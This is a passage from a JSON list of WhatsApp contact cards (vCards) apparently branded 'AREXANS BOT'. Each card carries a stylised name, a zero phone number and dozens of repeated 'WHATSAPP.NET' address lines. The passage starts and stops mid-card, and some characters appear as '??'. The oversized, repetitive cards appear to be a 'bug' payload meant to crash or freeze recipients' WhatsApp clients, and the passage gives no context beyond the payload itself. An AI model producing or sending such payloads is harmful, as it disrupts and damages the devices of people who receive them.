𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
							    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈??𝘌𝘟𝘈𝘕?? 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈??𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
							    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕?? 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆??️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹??𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
							    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈??𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 